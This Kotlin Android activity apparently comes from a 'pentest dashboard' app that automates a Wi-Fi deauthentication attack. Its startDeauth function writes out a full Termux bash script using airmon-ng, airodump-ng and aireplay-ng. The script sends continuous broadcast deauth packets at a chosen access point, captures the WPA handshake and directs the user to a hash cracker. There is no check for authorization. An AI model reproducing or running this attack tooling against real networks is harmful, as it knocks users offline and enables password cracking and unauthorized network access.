package com.pentest.dashboard

import android.os.Bundle
import android.widget.ArrayAdapter
import android.widget.ImageView
import android.widget.ListView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton

class WiFiDeauthActivity : AppCompatActivity() {

    private lateinit var networkList: ListView
    private lateinit var logOutput: TextView
    private lateinit var btnScan: MaterialButton
    private lateinit var btnDeauth: MaterialButton
    private lateinit var btnConfigureAttack: MaterialButton

    private val networks = mutableListOf<String>()
    private var selectedNetwork: String? = null
    private var attackParameters: Map<String, String>? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_wifi_deauth)

        initializeViews()
        setupClickListeners()
    }

    private fun initializeViews() {
        networkList = findViewById(R.id.networkList)
        logOutput = findViewById(R.id.logOutput)
        btnScan = findViewById(R.id.btnScan)
        btnDeauth = findViewById(R.id.btnDeauth)
        btnConfigureAttack = findViewById(R.id.btnConfigureAttack)

        val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, networks)
        networkList.adapter = adapter

        networkList.setOnItemClickListener { _, _, position, _ ->
            selectedNetwork = networks[position]
            addLog("Selected: $selectedNetwork")
            btnConfigureAttack.isEnabled = true
        }
    }

    private fun setupClickListeners() {
        findViewById<ImageView>(R.id.btnBack).setOnClickListener { finish() }

        btnScan.setOnClickListener {
            scanNetworks()
        }

        btnConfigureAttack.setOnClickListener {
            showParameterDialog()
        }

        btnDeauth.setOnClickListener {
            attackParameters?.let { params ->
                startDeauth(params)
            }
        }
    }

    private fun showParameterDialog() {
        // Create parameter list with AUTO-DISCOVERY
        val parameters = listOf(
            ParameterDialog.SSID,
            ParameterDialog.BSSID,
            ParameterDialog.CHANNEL,
            ParameterDialog.NETWORK_INTERFACE.copy(defaultValue = "wlan0mon"),
            ParameterDialog.Parameter(
                "DEAUTH_COUNT",
                "Deauth Packets",
                "Number of deauth packets to send (0 = continuous)",
                defaultValue = "0",
                required = true
            ),
            ParameterDialog.Parameter(
                "ATTACK_MODE",
                "Attack Mode",
                "broadcast or targeted",
                defaultValue = "broadcast",
                required = true
            )
        )

        // Show dialog and collect parameters
        ParameterDialog(this).showDialog(
            title = "Configure Deauth Attack",
            parameters = parameters
        ) { values ->
            attackParameters = values
            btnDeauth.isEnabled = true
            addLog("=== ATTACK CONFIGURED ===")
            addLog("SSID: ${values["SSID"]}")
            addLog("BSSID: ${values["BSSID"]}")
            addLog("Channel: ${values["CHANNEL"]}")
            addLog("Interface: ${values["NETWORK_INTERFACE"]}")
            addLog("Deauth Count: ${values["DEAUTH_COUNT"]}")
            addLog("Mode: ${values["ATTACK_MODE"]}")
            addLog("")
            addLog("Click 'START DEAUTH' to begin attack")
        }
    }

    private fun scanNetworks() {
        addLog("=== WIFI SCAN STARTED ===")
        addLog("Sending scan command to ESP32 Marauder...")
        addLog("")
        addLog("This requires:")
        addLog("- ESP32 Marauder attached to Flipper")
        addLog("- OR monitor mode enabled on phone")
        addLog("")
        addLog("Scanning 2.4GHz channels...")
        addLog("")
        addLog("NOT YET IMPLEMENTED - Requires hardware integration")
    }

    private fun startDeauth(params: Map<String, String>) {
        val ssid = params["SSID"] ?: ""
        val bssid = params["BSSID"] ?: ""
        val channel = params["CHANNEL"]?.toIntOrNull() ?: 6
        val count = params["DEAUTH_COUNT"]?.toIntOrNull() ?: 0
        val mode = params["ATTACK_MODE"] ?: "broadcast"

        addLog("=== DEAUTH ATTACK STARTED ===")
        addLog("Target: $ssid ($bssid)")
        addLog("Channel: $channel")
        addLog("Mode: $mode")
        addLog("")

        // Create automated workflow script
        val fullScript = """
            #!/data/data/com.termux/files/usr/bin/bash

            echo "=== AUTOMATED WiFi ATTACK ==="
            echo "Target: $bssid"
            echo "Channel: $channel"
            echo ""

            # Enable monitor mode
            echo "[1/4] Enabling monitor mode..."
            sudo airmon-ng check kill
            sudo airmon-ng start wlan0

            # Start capture in background
            echo "[2/4] Starting handshake capture..."
            sudo airodump-ng -c $channel --bssid $bssid -w /sdcard/Download/handshake wlan0mon &
            CAPTURE_PID=$!
            sleep 5

            # Deauth attack
            echo "[3/4] Sending deauth packets to force handshake..."
            sudo aireplay-ng --deauth $count -a $bssid wlan0mon
            sleep 10

            # Stop capture
            echo "[4/4] Stopping capture..."
            sudo kill ${'$'}CAPTURE_PID

            echo ""
            echo "=== CAPTURE COMPLETE ==="
            echo "Handshake saved to: /sdcard/Download/handshake-01.cap"
            echo ""
            echo "To crack password, use Hash Cracker activity"
        """.trimIndent()

        addLog("Executing automated attack script...")
        addLog("")

        // Execute in Termux
        val termux = TermuxIntegration(this)
        termux.runCommand(fullScript, background = false)

        addLog("âœ“ Script sent to Termux")
        addLog("")
        addLog("Check Termux for live output!")
        addLog("Handshake will be saved to /sdcard/Download/")
    }

    private fun addLog(message: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
            .format(java.util.Date())
        val currentLog = logOutput.text.toString()
        logOutput.text = "[$timestamp] $message\n$currentLog"
    }
}
